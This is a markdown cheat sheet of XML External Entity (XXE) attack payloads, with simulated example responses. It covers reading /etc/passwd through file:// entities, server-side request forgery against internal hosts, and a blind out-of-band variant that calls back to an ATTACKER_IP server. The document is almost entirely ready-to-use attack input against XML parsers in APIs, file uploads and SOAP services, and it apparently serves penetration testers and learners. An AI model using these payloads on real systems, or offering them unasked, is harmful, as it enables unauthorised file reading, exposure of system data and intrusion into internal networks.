# XML EXTERNAL ENTITY (XXE)

### Test for XXE

```bash
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

> Submit in XML inputs

**Why:** APIs, file uploads, SOAP

<details>
<summary>Example Output</summary>

```
Submit XML:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

Response includes:
root:x:0:0:root:/root:/bin/bash
(XXE CONFIRMED - can read files)
```
</details>

---

### XXE to read files

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

> Read local files

**Why:** LFI via XML parser

<details>
<summary>Example Output</summary>

```
Submit:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>&xxe;</user>

Response:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:...
(File read via XXE)
```
</details>

---

### XXE SSRF

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host/">]>
```

> Access internal services

**Why:** Pivot to internal network

<details>
<summary>Example Output</summary>

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://172.16.1.10:8080/">]>
<root>&xxe;</root>

Response includes internal page content
(Access internal services through XXE)
```
</details>

---

### Blind XXE (out-of-band)

```bash
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/xxe">]>
```

> Confirm with HTTP callback

**Why:** If no output in response

<details>
<summary>Example Output</summary>

```
Submit:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/gotcha">]>

Attacker HTTP server:
10.10.10.5 - - 'GET /gotcha HTTP/1.1' 200 -
(Confirms XXE even with no visible output)
```
</details>

---
